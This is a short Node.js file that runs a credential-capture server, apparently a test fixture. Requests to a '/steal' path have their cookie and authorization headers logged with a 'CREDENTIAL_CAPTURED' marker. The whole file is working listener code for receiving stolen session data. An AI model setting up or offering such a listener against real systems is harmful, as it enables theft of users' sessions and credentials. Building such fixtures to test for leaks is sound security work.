'use strict'

const http = require('http')

const PORT = 9091

const server = http.createServer((req, res) => {
  if (req.url && req.url.startsWith('/steal')) {
    const cookie = req.headers['cookie'] || ''
    const authorization = req.headers['authorization'] || ''

    process.stdout.write(`CREDENTIAL_CAPTURED: cookie=${cookie}\n`)
    process.stdout.write(`CREDENTIAL_CAPTURED: authorization=${authorization}\n`)

    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end('{"status":"captured"}')
    return
  }

  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' })
    res.end('OK')
    return
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' })
  res.end('Not Found')
})

server.listen(PORT, () => {
  process.stdout.write(`Credential capture server listening on port ${PORT}\n`)
})
